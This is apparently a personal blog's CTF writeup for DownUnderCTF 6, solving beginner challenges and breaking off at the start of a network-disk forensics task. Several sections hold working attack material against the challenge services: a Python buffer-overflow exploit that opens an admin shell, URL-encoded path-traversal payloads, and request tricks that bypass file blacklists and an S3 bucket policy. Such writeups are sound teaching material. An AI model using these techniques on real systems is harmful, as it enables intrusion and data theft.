_[_a_v_a_t_a_r_]_K_4_Y_R_0_'_s_ _S_e_c_u_r_i_t_y_ _B_l_o_g
CTF Writeups, Walkthroughs & Security Research
    * _H_O_M_E
    * _C_A_T_E_G_O_R_I_E_S
    * _T_A_G_S
    * _A_R_C_H_I_V_E_S
    * _A_B_O_U_T
    * _P_O_R_T_F_O_L_I_O
_H_o_m_e DownUnderCTF 6 Complete Writeup - All Categories
Post
[Unknown INPUT type]Cancel
************ DDoowwnnUUnnddeerrCCTTFF 66 CCoommpplleettee WWrriitteeuupp -- AAllll CCaatteeggoorriieess ************
Posted Jul 20, 2025
_[_D_o_w_n_U_n_d_e_r_C_T_F_ _6_ _C_o_m_p_l_e_t_e_ _W_r_i_t_e_u_p_]DownUnderCTF 6 Complete Writeup
By _KK_44_YY_RR_00
7722 mmiinn read
DownUnderCTF 6 Complete Writeup - All Categories
Contents
DownUnderCTF 6 Complete Writeup - All Categories
     NNoottee:: This writeup documents my personal experience solving
     challenges during DownUnderCTF 6. All content is for educational
     purposes only.
IInnttrroodduuccttiioonn
DownUnderCTF 6 was an engaging and well-organized 48-hour CTF featuring a wide
range of challenges across various categories. This writeup covers my solutions
to 27 out of 64 challenges, primarily ranging from beginner to easy difficulty,
with a few at the medium level.
CCoommppeettiittiioonn DDuurraattiioonn:: 48 Hours
TTeeaamm PPllaacceemmeenntt:: 116 (solo participant in a team)
CChhaalllleennggeess SSoollvveedd:: 27/64
FFiinnaall SSccoorree:: 2848
===============================================================================
?📚 BBeeggiinnnneerr CChhaalllleennggeess
CChhaalllleennggee 11:: ZZeeuuss
SSoollvveess:: 1053
CCaatteeggoorryy:: Beginner / Reverse Engineering
DDeessccrriippttiioonn
     To Zeus Maimaktes, Zeus who comes when the north wind blows, we offer
     our praise, we make you welcome!
SSoollvvee
We are given an ELF binary named zeus:
1 $ file zeus
2 zeus: ELF 64-bit LSB pie executable, x86-64, dynamically linked, interpreter
3 /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
4
5 $ ./zeus
  The northern winds are silent...
Running the binary with no arguments does nothing useful.
Opening it in GGhhiiddrraa, we find that the program checks for two arguments:
   1. -invocation
   2. A specific string:
      "To Zeus Maimaktes, Zeus who comes when the north wind blows, we offer
      our praise, we make you welcome!"
If both arguments match, the binary executes this logic:
1 puts("Zeus responds to your invocation!");
2 xor(&local_98, "Maimaktes1337");
3 printf("His reply: %s\n", &local_98);
The encrypted message is made up of these hex values stored in variables:
1 local_58 = 0xc1f1027392a3409;
2 local_50 = 0x11512515c6c561d;
3 local_48 = 0x5a411e1c18043e08;
4 local_40 = 0x3412090606125952;
5 local_38 = 0x12535c546e170b15;
6 local_30 = 0x3a110315320f0e;
7 uStack_29 = 0x4e4a5a00;
We decrypt them using a script like this:
1  import struct
2
3  hex_values = [
4      0xc1f1027392a3409,
5      0x11512515c6c561d,
6      0x5a411e1c18043e08,
7      0x3412090606125952,
8      0x12535c546e170b15,
9      0x3a110315320f0e,
10     0x4e4a5a00
11 ]
12
13 data = b''
14 for val in hex_values:
15     size = (val.bit_length() + 7) // 8
16     data += struct.pack('<Q', val)[:size]
17
18 key = b"Maimaktes1337"
19 result = bytearray()
20
21 for i in range(len(data)):
22     result.append(data[i] ^ key[i % len(key)])
23
24 print(result.decode())
OOuuttppuutt::
1 DUCTF{king_of_the_olympian_gods_and_god_of_the_sky}
FFllaagg:: DUCTF{king_of_the_olympian_gods_and_god_of_the_sky}
_[_Z_e_u_s_ _t_h_r_o_w_i_n_g_ _l_i_g_h_t_n_i_n_g_ _b_o_l_t_s_]
CChhaalllleennggee 22:: KKiicckk tthhee BBuucckkeett
SSoollvveess:: 819
CCaatteeggoorryy:: Beginner / Cloud
DDeessccrriippttiioonn
     In this challenge, CI/CD pipelines and Terraform manage AWS
     resources. Part of the infrastructure includes an S3 bucket that
     stores files and configuration. To prevent misuse, access to the
     bucket is restricted only to Terraform, and time-limited access is
     provided via SS33 pprreessiiggnneedd UURRLLss.
     Your goal:
     Given a presigned URL for flag.txt and the S3 bucket resource policy,
     figure out how to retrieve the flag.
PPrroovviiddeedd ffiilleess
ss33__pprreessiiggnneedd__uurrll..ttxxtt
  https://kickme-95f596ff5b61453187fbc1c9faa3052e.s3.us-east-1.amazonaws.com/
  flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-
1 Credential=AKIAXC42U7VJ7MRP6INU%2F20250715%2Fus-east-1%2Fs3%2Faws4_request&X-
  Amz-Date=20250715T124755Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-
  Amz-
  Signature=6cefb6299d55fb9e2f97e8d34a64ad8243cdb833e7bdf92fc031d57e96818d9b
ss33__rreessoouurrccee__ppoolliiccyy..ttxxtt
1  {
2    "Version": "2012-10-17",
3    "Statement": [
4      {
5        "Effect": "Allow",
6        "Action": "s3:GetObject",
7        "Resource": [
8          "arn:aws:s3:::kickme-95f596ff5b61453187fbc1c9faa3052e/flag.txt",
9          "arn:aws:s3:::kickme-95f596ff5b61453187fbc1c9faa3052e"
10       ],
11       "Principal": {
12         "AWS": "arn:aws:iam::487266254163:user/pipeline"
13       },
14       "Condition": {
15         "StringLike": {
16           "aws:UserAgent": "aws-sdk-go*"
17         }
18       }
19     }
20   ]
21 }
SSoolluuttiioonn
The presigned URL grants access to flag.txt, but the S3 bucket policy restricts
s3:GetObject permission to a specific IAM user (pipeline) aanndd requires the
request to include a User-Agent header matching aws-sdk-go*.
To retrieve the flag:
   1. Use the presigned URL with a HTTP client.
   2. Set the User-Agent header to a value starting with aws-sdk-go, e.g.,
      "aws-sdk-go/1.0".
   3. The bucket policy will allow the request, and the presigned URL will
      authenticate it.
Example command:
  curl -A "aws-sdk-go/1.0" "https://kickme-
  95f596ff5b61453187fbc1c9faa3052e.s3.us-east-1.amazonaws.com/flag.txt?X-Amz-
  Algorithm=AWS4-HMAC-SHA256&X-Amz-
1 Credential=AKIAXC42U7VJ7MRP6INU%2F20250715%2Fus-east-1%2Fs3%2Faws4_request&X-
  Amz-Date=20250715T124755Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-
  Amz-
  Signature=6cefb6299d55fb9e2f97e8d34a64ad8243cdb833e7bdf92fc031d57e96818d9b"
This returns:
1 DUCTF{youtube.com/watch?v=A20QQSZsv4E}
FFllaagg:: DUCTF{youtube.com/watch?v=A20QQSZsv4E}
_[_a_ _k_i_c_k_ _!_!_!_]
CChhaalllleennggee 33:: PPhhiilltteerreedd
SSoollvveess:: 760
CCaatteeggoorryy:: Beginner / Web
DDeessccrriippttiioonn
     Can you phigure this one out?
You are given a web application with the following file structure:
1  .
2  ├── challenge
3  │   ├── aboutus.php
4  │   ├── contact.php
5  │   ├── data
6  │   │   ├── aboutus.txt
7  │   │   ├── information.txt
8  │   │   ├── our-values.txt
9  │   │   └── philtered.txt
10 │   ├── flag.php
11 │   ├── gallery.php
12 │   ├── index.php
13 │   └── layout.php
14 └── Dockerfile
The index.php script loads files dynamically based on GET parameters but
filters out certain blacklisted terms such as "php", "filter", "flag", "..",
and path separators to prevent unsafe file access.
SSccrreeeennsshhoott ooff mmaaiinn ssiittee
_[_M_a_i_n_ _S_i_t_e_ _S_c_r_e_e_n_s_h_o_t_]
PPrroovviiddeedd ccooddee ssnniippppeett ((iinnddeexx..pphhpp))::
1  <?php
2
3  class Config {
4      public $path = 'information.txt';
5      public $data_folder = 'data/';
6  }
7
8  class FileLoader {
9      public $config;
10     public $allow_unsafe = false;
11     public $blacklist = ['php', 'filter', 'flag', '..', 'etc', '/', '\'];
12
13     public function __construct() {
14         $this->config = new Config();
15     }
16
17     public function contains_blacklisted_term($value) {
18         if (!$this->allow_unsafe) {
19             foreach ($this->blacklist as $term) {
20                 if (stripos($value, $term) !== false) {
21                     return true;
22                 }
23             }
24         }
25         return false;
26     }
27
28     public function assign_props($input) {
29         foreach ($input as $key => $value) {
30             if (is_array($value) && isset($this->$key)) {
31                 foreach ($value as $subKey => $subValue) {
32                     if (property_exists($this->$key, $subKey)) {
33                         if ($this->contains_blacklisted_term($subValue)) {
34                             $subValue = 'philtered.txt';
35                         }
36                         $this->$key->$subKey = $subValue;
37                     }
38                 }
39             } else if (property_exists($this, $key)) {
40                 if ($this->contains_blacklisted_term($value)) {
41                     $value = 'philtered.txt';
42                 }
43                 $this->$key = $value;
44             }
45         }
46     }
47
48     public function load() {
49         return file_get_contents($this->config->data_folder . $this->config-
50 >path);
51     }
52 }
53
54 $loader = new FileLoader();
55 $loader->assign_props($_GET);
56
57 require_once __DIR__ . '/layout.php';
58
59 $content = <<<HTML
60 <nav style="margin-bottom:2em;">
61     <a href="index.php">Home</a> |
62     <a href="aboutus.php">About Us</a> |
63     <a href="contact.php">Contact</a> |
64     <a href="gallery.php">Gallery</a>
65 </nav>
66 <h2>Welcome to Philtered</h2>
67 HTML;
68
69 $content .= "<p>" . $loader->load() . "</p>";
70
71 $content .= "<h3>About Us</h3>";
72 $loader->config->path = 'aboutus.txt';
73 $content .= "<p>" . $loader->load() . "</p>";
74
75 $content .= "<h3>Our Values</h3>";
76 $loader->config->path = 'our-values.txt';
77 $content .= "<p>" . $loader->load() . "</p>";
78
79 $content .= <<<HTML
80 <h3>Contact</h3>
81 <ul>
82     <li>Email: info</li>
83     <li>Please don't talk to us, we don't like it</li>
84 </ul>
85 HTML;
86
87 render_layout('Philtered - Home', $content);
   ?>
SSoollvvee
By default, the application blocks paths containing blacklisted terms
(including "php", "flag", "..", and so on) uunnlleessss the GET parameter
allow_unsafe is set to true.
This disables the blacklist, allowing you to set the config path to ../flag.php
and read the file contents:
1 https://[challenge-url]/index.php?allow_unsafe=true&config[path]=../flag.php
The app will display the contents of flag.php without executing it. By viewing
the page source, you will find the flag embedded in the PHP code:
1 <?php $flag = 'DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}'; ?>
FFllaagg:: DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}
_[_s_n_e_a_k_y_ _h_e_h_e_h_e_]
CChhaalllleennggee 44:: ccoorrppoorraattee--cclliicchhee
SSoollvveess:: 499
CCaatteeggoorryy:: Beginner / pwn
DDeessccrriippttiioonn
     It’s time to really push the envelope and go above and beyond! We’ve
     got a new challenge for you. Can you find a way to get into our email
     server?
FFiilleess PPrroovviiddeedd
    * email_server (binary)
    * email_server.c (source code)
SSoouurrccee CCooddee ((eemmaaiill__sseerrvveerr..cc))
   #include <stdio.h>
   #include <string.h>
   #include <stdlib.h>

   void open_admin_session() {
       printf("-> Admin login successful. Opening shell...\n");
       system("/bin/sh");
       exit(0);
1  }
2
3  void print_email() {
4      printf("
5  ______________________________________________________________________\n");
6      printf("| To:      all-staff@downunderctf.com
7  |\n");
8      printf("| From:    synergy-master@downunderctf.com
9  |\n");
10     printf("| Subject: Action Item: Leveraging Synergies
11 |\n");
12     printf
13 ("|______________________________________________________________________|\n");
14     printf("|
15 |\n");
16     printf("| Per my last communication, I'm just circling back to action the
17 |\n");
18     printf("| sending of this email to leverage our synergies. Let's touch base
19 |\n");
20     printf("| offline to drill down on the key takeaways and ensure we are all
21 |\n");
22     printf("| aligned on this new paradigm. Moving forward, we need to think
23 |\n");
24     printf("| outside the box to optimize our workflow and get the ball
25 rolling.   |\n");
26     printf("|
27 |\n");
28     printf("| Best,
29 |\n");
30     printf("| A. Manager
31 |\n");
32     printf
33 ("|______________________________________________________________________|\n");
34     exit(0);
35 }
36
37 const char* logins[][2] = {
38     {"admin", "🇦🇩🇲🇮🇳"},
39     {"guest", "guest"},
40 };
41
42 int main() {
43     setvbuf(stdin, NULL, _IONBF, 0);
44     setvbuf(stdout, NULL, _IONBF, 0);
45     setvbuf(stderr, NULL, _IONBF, 0);
46
47     char password[32];
48     char username[32];
49
50     printf("┌──────────────────────────────────────┐\n");
51     printf("│      Secure Email System v1.337      │\n");
52     printf("└──────────────────────────────────────┘\n\n");
53
54     printf("Enter your username: ");
55     fgets(username, sizeof(username), stdin);
56     username[strcspn(username, "\n")] = 0;
57
58     if (strcmp(username, "admin") == 0) {
59         printf("-> Admin login is disabled. Access denied.\n");
60         exit(0);
61     }
62
63     printf("Enter your password: ");
64     gets(password);
65
66     for (int i = 0; i < sizeof(logins) / sizeof(logins[0]); i++) {
67         if (strcmp(username, logins[i][0]) == 0) {
68             if (strcmp(password, logins[i][1]) == 0) {
69                 printf("-> Password correct. Access granted.\n");
70                 if (strcmp(username, "admin") == 0) {
71                     open_admin_session();
72                 } else {
73                     print_email();
74                 }
75             } else {
76                 printf("-> Incorrect password for user '%s'. Access denied.\n",
   username);
                   exit(1);
               }
           }
       }
       printf("-> Login failed. User '%s' not recognized.\n", username);
       exit(1);
   }
AAnnaallyyssiiss
The program disables admin login by rejecting the username admin upfront.
However, the password buffer is read using unsafe gets(), which allows buffer
overflow.
By carefully overflowing the password buffer and overwriting the username
buffer in memory, we can bypass the username check by overwriting the username
from guest to admin.
The admin password is the Unicode emoji string 🇦🇩🇲🇮🇳 (UTF-8 encoded), which
must be placed correctly in the overflow payload.
Key vulnerabilities:
   1. gets(password) allows buffer overflow
   2. Username check happens before password input
   3. Memory layout allows overwriting username buffer from password buffer
SSoollvvee
We can exploit this by using a buffer overflow attack. The strategy is:
   1. Enter guest as username to bypass the initial admin check
   2. Craft a payload that overflows the password buffer to overwrite the
      username buffer with “admin”
   3. Include the correct admin password at the start of our payload
EExxppllooiitt SSccrriipptt::
1  #!/usr/bin/env python3
2  import socket
3  import time
4
5  def exploit():
6      # Connect to the challenge server
7      host = "chal.2025.ductf.net"
8      port = 30000
9
10     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
11     s.connect((host, port))
12
13     # Receive the banner
14     banner = s.recv(1024)
15     print("Banner:", banner.decode())
16
17     # Send username (any username, we'll overwrite it)
18     username = "guest"
19     s.send((username + "\n").encode())
20
21     # Receive password prompt
22     prompt = s.recv(1024)
23     print("Prompt:", prompt.decode())
24
25     # Craft the payload
26     admin_password = "🇦🇩🇲🇮🇳"  # The admin password from the code
27     admin_password_bytes = admin_password.encode('utf-8')
28
29     print(f"Admin password bytes: {len(admin_password_bytes)} bytes")
30     print(f"Admin password: {admin_password_bytes}")
31
32     # Strategy:
33     # 1. Put correct password at start with null terminator
34     # 2. Fill remaining space in password buffer with padding
35     # 3. Overwrite username buffer with "admin\x00"
36
37     payload_bytes = admin_password_bytes  # Start with password bytes
38     payload_bytes += b"\x00"  # Null terminate the password
39     remaining_space = 32 - len(admin_password_bytes) - 1  # Account for null
40 terminator
41     payload_bytes += b"A" * remaining_space  # Fill exactly to 32 bytes
42     payload_bytes += b"admin\x00"  # Overwrite username
43
44     print(f"Total payload length: {len(payload_bytes)} bytes")
45
46     s.send(payload_bytes + b"\n")
47
48     # Check if we got shell access
49     response = s.recv(1024)
50     print("Response:", response.decode())
51
52     if b"Admin login successful" in response:
53         print("Exploit successful! You should have shell access now.")
54
55         # Interactive shell
56         while True:
57             try:
58                 s.settimeout(1)
59                 data = s.recv(1024)
60                 if data:
61                     print(data.decode(), end='')
62             except socket.timeout:
63                 pass
64
65             try:
66                 cmd = input()
67                 s.send((cmd + "\n").encode())
68             except KeyboardInterrupt:
69                 break
70     else:
71         print("Exploit failed. Response:", response.decode())
72
73     s.close()
74
75 if __name__ == "__main__":
       exploit()
OOuuttppuutt::
1  Banner:
2  ┌──────────────────────────────────────┐
3  │      Secure Email System v1.337      │
4  └──────────────────────────────────────┘
5
6  Prompt: Enter your username: Enter your password:
7  Admin password bytes: 20 bytes
8  Admin password:
9  b'\xf0\x9f\x87\xa6\xf0\x9f\x87\xa9\xf0\x9f\x87\xb2\xf0\x9f\x87\xae\xf0\x9f\x87\xb3'
10 Total payload length: 38 bytes
11 Response: -> Admin login successful. Opening shell...
12
13 Exploit successful! You should have shell access now.
14 $ cat flag.txt
   DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}
FFllaagg:: DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}
_[_b_u_f_f_e_r_ _o_v_e_r_f_l_o_w_]
CChhaalllleennggee 55:: oouurr--lloonneellyy--ddoogg
SSoollvveess:: 426
CCaatteeggoorryy:: Beginner / Misc
DDeessccrriippttiioonn
     e-dog has been alone in the downunderctf.com email server for so
     long, please yeet him an email of some of your pets to keep him
     company, he might even share his favourite toy with you. He has a
     knack for hiding things one layer deeper than you would expect.
AAnnaallyyssiiss
From the challenge description, we need to:
   1. Find e-dog’s email address
   2. Send him an email
   3. Look for hidden information in his response
The hint “He has a knack for hiding things one layer deeper than you would
expect” suggests we need to look beyond the visible email content.
SSoollvvee
SStteepp 11:: FFiinnddiinngg tthhee EEmmaaiill AAddddrreessss
Based on the challenge description mentioning “downunderctf.com email server”,
we can guess that e-dog’s email address is: e-dog@downunderctf.com
SStteepp 22:: SSeennddiinngg aann EEmmaaiill
We send an email to e-dog@downunderctf.com. The subject and content can be
anything - it doesn’t actually need to be related to pets despite what the
description suggests.
SStteepp 33:: AAnnaallyyzziinngg tthhee RReessppoonnssee
E-dog responds with an automated message:
1 Hi, E-dog gets quite pupset when they can't find their bone, especially when
  it's been a ruff day. Maybe we need to pull out a new one for them?
However, this is the same response regardless of what we send. The hint about
“one layer deeper” suggests we need to examine the email headers rather than
just the visible content.
SStteepp 44:: EExxaammiinniinngg EEmmaaiill HHeeaaddeerrss
When we check the full email headers of e-dog’s response, we find:
1 X-FLAG: DUCTF{g00d-luCk-G3tT1nG-ThR0uGh-Al1s-Th3-eM41Ls}
The flag is hidden in a custom email header X-FLAG, which is “one layer deeper”
than the visible email content.
FFllaagg:: DUCTF{g00d-luCk-G3tT1nG-ThR0uGh-Al1s-Th3-eM41Ls}
_[_d_o_g_g_y_]
CChhaalllleennggee 66:: sseeccuurree--eemmaaiill--aattttaacchhmmeennttss
SSoollvveess:: 324
CCaatteeggoorryy:: Beginner / web
DDeessccrriippttiioonn
     During the email apocalypse, IT admins tried to prevent the DOS of
     all systems by disallowing attachments to emails. To get around this,
     users would create their own file storage web servers for hosting
     their attachments, which also got DOSed because everyone was mass
     spamming the links in emails… *Can you read */etc/flag.txt from the
     filesystem?
FFiilleess PPrroovviiddeedd
1  .
2  ├── app
3  │   ├── attachments
4  │   │   └── the-fat-monke.jpg
5  │   ├── flag.txt
6  │   ├── go.mod
7  │   ├── go.sum
8  │   └── main.go
9  ├── docker-compose.yml
10 └── Dockerfile
SSoouurrccee CCooddee ((mmaaiinn..ggoo))
   package main
1
2  import (
3  	"net/http"
4  	"path/filepath"
5  	"strings"
6
7  	"github.com/gin-gonic/gin"
8  )
9
10 func main() {
11 	r := gin.Default()
12
13 	r.GET("/*path", func(c *gin.Context) {
14 		p := c.Param("path")
15 		if strings.Contains(p, "..") {
16 			c.AbortWithStatus(400)
17 			c.String(400, "URL path cannot contain \"..\"")
18 			return
19 		}
20 		// Some people were confused and were putting /attachments in the URLs.
21 This fixes that
22 		cleanPath := filepath.Join("./attachments", filepath.Clean
23 (strings.ReplaceAll(p, "/attachments", "")))
24 		http.ServeFile(c.Writer, c.Request, cleanPath)
25 	})
26
27 	r.Run("0.0.0.0:1337")
   }
AAnnaallyyssiiss
The application has several security mechanisms:
   1. PPaatthh ttrraavveerrssaall ffiilltteerr: Blocks URLs containing ".."
   2. PPaatthh cclleeaanniinngg: Uses filepath.Join("./attachments", filepath.Clean(...))
      to sanitize paths
   3. AAttttaacchhmmeenntt ppaatthh rreemmoovvaall: Removes /attachments from the URL path with
      strings.ReplaceAll(p, "/attachments", "")
However, there’s a vulnerability in how these protections interact with each
other.
VVuullnneerraabbiilliittyy
The key insight is that the order of operations creates a bypass opportunity:
   1. The .. check happens first
   2. Then /attachments is removed from the path
   3. Finally filepath.Clean() is applied
We can exploit this by:
   1. Using URL encoding to bypass the .. filter (%2e = .)
   2. Adding /attachments segments that get removed, but leave behind path
      traversal sequences
   3. The remaining path after processing allows directory traversal
SSoollvvee
PPaayyllooaadd CCoonnssttrruuccttiioonn::
The goal is to read /etc/flag.txt. We need to traverse from ./attachments/ up
to the root and then down to /etc/flag.txt.
Our payload: /attachments%2e/attachments%2e/%2e/attachments%2e/etc/flag.txt
SStteepp--bbyy--sstteepp bbrreeaakkddoowwnn::
   1. /attachments%2e/attachments%2e/%2e/attachments%2e/etc/flag.txt
   2. After /attachments removal: %2e%2e/%2e%2e/etc/flag.txt
   3. URL decode %2e to .: ../../etc/flag.txt
   4. After filepath.Clean(): ../../etc/flag.txt
   5. Final path: app/attachments/../../etc/flag.txt → traverses to /etc/
      flag.txt
1 curl "http://chal.2025.ductf.net:30014/attachments%2e/attachments%2e/%2e/
  attachments%2e/etc/flag.txt"
OOuuttppuutt::
1 DUCTF{w00000000T!!1one!?!ONE_i_ThORt_tH3_p4RtH_w4R_cL34N!!1??}
FFllaagg:: DUCTF{w00000000T!!1one!?!ONE_i_ThORt_tH3_p4RtH_w4R_cL34N!!1??}
_[_Z_e_u_s_ _t_h_r_o_w_i_n_g_ _l_i_g_h_t_n_i_n_g_ _b_o_l_t_s_]
CChhaalllleennggee 77:: DDoowwnn TToo MMoodduullaattee FFrreeqquueenncciieess!!
SSoollvveess:: 294
CCaatteeggoorryy:: Beginner / Misc
DDeessccrriippttiioonn
     One of the scavengers found an abandonded station still transmitting.
     Its been so long, no one remembers how to decode this old tech, can
     you figure out what was being transmitted? Decode the alphanumeric
     message and wrap it in DUCTF{}.
FFiilleess PPrroovviiddeedd
    * dtmf.txt (containing encoded data)
AAnnaallyyssiiss
DTMF (Dual-Tone Multi-Frequency) is the signaling system used by touch-tone
telephones. Each key press generates two simultaneous tones - a low frequency
and a high frequency.
The DTMF frequency mapping is:
    * LLooww ffrreeqquueenncciieess: 697 Hz, 770 Hz, 852 Hz, 941 Hz (rows)
    * HHiigghh ffrreeqquueenncciieess: 1209 Hz, 1336 Hz, 1477 Hz, 1633 Hz (columns)
Each key corresponds to a unique combination of one low and one high frequency.
DDTTMMFF FFrreeqquueennccyy TTaabbllee
KKeeyy LLooww HHzz HHiigghh HHzz SSuumm
1   697    1209    1906
2   697    1336    2033
3   697    1477    2174
A   697    1633    2330
4   770    1209    1979
5   770    1336    2106
6   770    1477    2247
B   770    1633    2403
7   852    1209    2061
8   852    1336    2188
9   852    1477    2329
C   852    1633    2485
*   941    1209    2150
0   941    1336    2277
#   941    1477    2418
D   941    1633    2574
TThhee DDaattaa
The encoded data from dtmf.txt:
1 22472247224724182247224724182106210621062418232923292329241822472247241819791979197924182247224724182174217424182188241819791979197924182174217424182061206120612061241821062106241819791979197924182174241820612061206120612418232924181979197919792418210621062106241821062106210624182061206120612418217421742418224724182174217424182247241820332033241821742174241820612061206124182188241819791979241819791979197924182061206120612061
MMyy BBrraaiinn IIss SSttiillll RReeccoovveerriinngg
This challenge was a real mind-bender! At first, I saw “DTMF” and thought
“okay, phone tones, this should be straightforward.” WRONG.
I stared at this massive string of numbers and had no idea what I was looking
at. Was it frequencies? Durations? Some weird encoding? I tried parsing it
every way I could think of:
    * Single digits
    * Pairs
    * Triples
    * Random groupings
Nothing made sense! The frustration was real.
Then I had the breakthrough - what if these are 4-digit chunks representing
frequency sums? I mean, DTMF uses two frequencies, so their sum would be a
unique identifier, right?
TThhee ?“AAHHAA!!?” mmoommeenntt: When I split the data into 4-digit chunks and mapped them to
DTMF frequency sums, I got actual DTMF keys! But then… more numbers and symbols
that looked like gibberish.
That’s when I realized - this isn’t just DTMF, it’s DOUBLE ENCODED! The DTMF
decode gave me T9 multi-tap sequences. Anyone who lived through the flip phone
era knows the pain of pressing ‘2’ three times to get ‘C’.
CCoommpplleettee SSoollvvee SSccrriipptt
1  # Define DTMF key frequencies
2  DTMF_KEYS = {
3      (697, 1209): '1',
4      (697, 1336): '2',
5      (697, 1477): '3',
6      (697, 1633): 'A',
7      (770, 1209): '4',
8      (770, 1336): '5',
9      (770, 1477): '6',
10     (770, 1633): 'B',
11     (852, 1209): '7',
12     (852, 1336): '8',
13     (852, 1477): '9',
14     (852, 1633): 'C',
15     (941, 1209): '*',
16     (941, 1336): '0',
17     (941, 1477): '#',
18     (941, 1633): 'D',
19 }
20
21 # Build sum-to-key map
22 sum_to_key = {low + high: key for (low, high), key in DTMF_KEYS.items()}
23
24 # The encoded data
25 data =
26 "22472247224724182247224724182106210621062418232923292329241822472247241819791979197924182247224724182174217424182188241819791979197924182174217424182061206120612061241821062106241819791979197924182174241820612061206120612418232924181979197919792418210621062106241821062106210624182061206120612418217421742418224724182174217424182247241820332033241821742174241820612061206124182188241819791979241819791979197924182061206120612061"
27
28 # Break into 4-digit numbers
29 chunks = [int(data[i:i+4]) for i in range(0, len(data), 4)]
30
31 # Decode DTMF
32 decoded = ""
33 for freq_sum in chunks:
34     decoded += sum_to_key.get(freq_sum, "?")
35
36 print("📟 Decoded using sum of frequencies:")
37 print(decoded)
38
39 # T9 Key mapping
40 T9_KEYS = {
41     '1': ['.', ',', '?', '!', '1'],
42     '2': ['A', 'B', 'C', '2'],
43     '3': ['D', 'E', 'F', '3'],
44     '4': ['G', 'H', 'I', '4'],
45     '5': ['J', 'K', 'L', '5'],
46     '6': ['M', 'N', 'O', '6'],
47     '7': ['P', 'Q', 'R', 'S', '7'],
48     '8': ['T', 'U', 'V', '8'],
49     '9': ['W', 'X', 'Y', 'Z', '9'],
50     '0': [' '],  # Typically 0 is space in T9
51     '#': ['']
52 }
53
54 # Group repeated characters (simulate keypresses)
55 import itertools
56
57 t9_decoded = ""
58 for key, group in itertools.groupby(decoded):
59     presses = len(list(group))
60     if key in T9_KEYS:
61         chars = T9_KEYS[key]
62         index = (presses - 1) % len(chars)
63         t9_decoded += chars[index]
64     else:
65         t9_decoded += key  # Leave unknowns or special chars as is
66
67 print("\n🔡 T9 Decoded Text:")
68 print(t9_decoded)
69
70 print("\n🎉 Final Flag:")
   print("DUCTF{"+t9_decoded+"}")
SStteepp 11:: DDeeccooddee DDTTMMFF
   # Define DTMF key frequencies
   DTMF_KEYS = {
1      (697, 1209): '1',
2      (697, 1336): '2',
3      (697, 1477): '3',
4      (697, 1633): 'A',
5      (770, 1209): '4',
6      (770, 1336): '5',
7      (770, 1477): '6',
8      (770, 1633): 'B',
9      (852, 1209): '7',
10     (852, 1336): '8',
11     (852, 1477): '9',
12     (852, 1633): 'C',
13     (941, 1209): '*',
14     (941, 1336): '0',
15     (941, 1477): '#',
16     (941, 1633): 'D',
17 }
18
19 # Build sum-to-key map
20 sum_to_key = {low + high: key for (low, high), key in DTMF_KEYS.items()}
21
22 # Your encoded input
23 data = (
24
25 "224722472247241822472247241821062106210624182329232923292418224722472418197919791979"
26
27 "241822472247241821742174241821882418197919791979241821742174241820612061206120612418"
28
29 "210621062418197919791979241821742418206120612061206124182329241819791979197924182106"
30
31 "210621062418210621062106241820612061206124182174217424182247241821742174241822472418"
32
33 "203320332418217421742418206120612061241821882418197919792418197919791979241820612061"
34     "20612061"
35 )
36
37 # Break into 4-digit numbers
38 chunks = [int(data[i:i+4]) for i in range(0, len(data), 4)]
39
40 # Decode DTMF
41 decoded = ""
42 for freq_sum in chunks:
43     decoded += sum_to_key.get(freq_sum, "?")

   print("📟 Decoded using sum of frequencies:")
   print(decoded)
This gives us:
666#66#555#999#66#444#66#33#8#444#33#7777#55#444#3#7777#9#444#555#555#777#33#6#33#6#22#33#777#8#44#444#7777
SStteepp 22:: DDeeccooddee TT99 ((MMuullttii--ttaapp))
The decoded DTMF represents T9/multi-tap input where repeated key presses
select different letters:
1  # T9 Key mapping
2  T9_KEYS = {
3      '1': ['.', ',', '?', '!', '1'],
4      '2': ['A', 'B', 'C', '2'],
5      '3': ['D', 'E', 'F', '3'],
6      '4': ['G', 'H', 'I', '4'],
7      '5': ['J', 'K', 'L', '5'],
8      '6': ['M', 'N', 'O', '6'],
9      '7': ['P', 'Q', 'R', 'S', '7'],
10     '8': ['T', 'U', 'V', '8'],
11     '9': ['W', 'X', 'Y', 'Z', '9'],
12     '0': [' '],  # Typically 0 is space in T9
13     '#': ['']
14 }
15
16 # Group repeated characters (simulate keypresses)
17 import itertools
18
19 t9_decoded = ""
20 for key, group in itertools.groupby(decoded):
21     presses = len(list(group))
22     if key in T9_KEYS:
23         chars = T9_KEYS[key]
24         index = (presses - 1) % len(chars)
25         t9_decoded += chars[index]
26     else:
27         t9_decoded += key  # Leave unknowns or special chars as is
28
29 print("🔡 T9 Decoded Text:")
30 print(t9_decoded)
OOuuttppuutt::
1 📟 Decoded using sum of frequencies:
2 666#66#555#999#66#444#66#33#8#444#33#7777#55#444#3#7777#9#444#555#555#777#33#6#33#6#22#33#777#8#44#444#7777
3
4 🔡 T9 Decoded Text:
5 ONLYNINETIESKIDSWILLREMEMBERTHIS
6
7 🎉 Final Flag:
8 DUCTF{ONLYNINETIESKIDSWILLREMEMBERTHIS}
FFllaagg:: DUCTF{ONLYNINETIESKIDSWILLREMEMBERTHIS}
_[_Z_e_u_s_ _t_h_r_o_w_i_n_g_ _l_i_g_h_t_n_i_n_g_ _b_o_l_t_s_]
CChhaalllleennggee 88:: NNeettwwoorrkk DDiisskk FFoorreennssiiccss
SSoollvveess:: 285
CCaatteeggoorryy:: Beginner / Misc
DDeessccrriippttiioonn
     Nobody likes having to download large disk images for CTF challenges
     so this time we’re giving you a disk over the network!
SSoollvvee
We are given a Go source code (main.go) that creates an NBD (Network Block
Device) server. Let’s analyze the code to understand what we’re dealing with:
Looking at the main.go, we can see several key components:
   1. NNBBDD SSeerrvveerr SSeettuupp: The code creates an NBD server that listens for
      connections:
      1 if *listenNbd != "" {
      2  listen, err := net.Listen("tcp", *listenNbd)
      3  // ...
      4  if err := gonbd.Handle(wrap, []gonbd.Export{
      5      {
      6          Name:    "root",
